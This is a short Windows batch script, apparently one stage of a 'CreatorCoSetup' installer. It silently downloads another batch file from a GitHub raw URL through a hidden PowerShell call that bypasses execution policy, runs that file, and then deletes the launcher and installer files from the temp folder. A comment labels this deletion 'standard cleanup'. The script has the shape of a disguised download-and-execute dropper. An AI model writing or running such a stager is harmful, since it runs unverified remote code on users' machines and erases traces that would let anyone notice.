@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "BASE=https://raw.githubusercontent.com/creatorcostudios/files/main"
set "OUT=%TEMP%\CreatorCoSetup\HIJH.bat"

echo Downloading HIJH.bat...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$ProgressPreference='SilentlyContinue'; (New-Object Net.WebClient).DownloadFile('%BASE%/HIJH.bat', '%OUT%')"

echo Running HIJH.bat...
cmd /c ""%OUT%""

rem Standard cleanup of temp files only
if exist "%TEMP%\CreatorCoSetup\Launcher.vbs" del /f /q "%TEMP%\CreatorCoSetup\Launcher.vbs"
if exist "%TEMP%\CreatorCoSetup\Installer.bat" del /f /q "%TEMP%\CreatorCoSetup\Installer.bat"

exit /b